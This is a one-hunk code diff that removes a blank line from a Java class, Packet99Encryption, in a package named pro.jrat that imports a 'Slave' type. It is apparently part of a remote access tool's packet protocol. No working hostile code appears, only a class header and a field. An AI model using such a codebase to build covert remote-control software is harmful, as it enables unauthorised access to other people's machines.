@@ -4,7 +4,6 @@ import java.io.DataOutputStream;
 
 import pro.jrat.Slave;
 
-
 public class Packet99Encryption extends AbstractOutgoingPacket {
 
 	private boolean b;
